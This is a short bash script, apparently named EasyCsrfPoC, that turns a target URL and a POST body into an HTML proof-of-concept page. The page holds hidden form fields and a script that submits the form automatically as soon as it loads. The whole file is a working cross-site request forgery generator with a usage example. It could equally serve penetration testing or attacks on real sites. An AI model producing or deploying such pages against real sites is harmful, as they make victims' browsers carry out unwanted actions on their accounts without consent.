#!/bin/bash

    url=$1
    body=$2
    output_file=$3

    echo "Generating PoC..."

    form_inputs=""

    IFS='&' read -ra params <<< "$body"
    for param in "${params[@]}"; do
        name=$(echo "$param" | cut -d'=' -f1)
        value=$(echo "$param" | cut -d'=' -f2)
        form_inputs+="<input type=\"hidden\" name=\"$name\" value=\"$value\">\n"
    done

    html_poc="<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <form method=\"POST\" action=\"$url\">
        $form_inputs
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>"

    echo -e "$html_poc" > "$output_file"
    echo "PoC HTML created: $output_file"


# Example usage
# ./EasyCsrfPoC "http://example.com/submit" "param1=value1&param2=value2" "output.html"

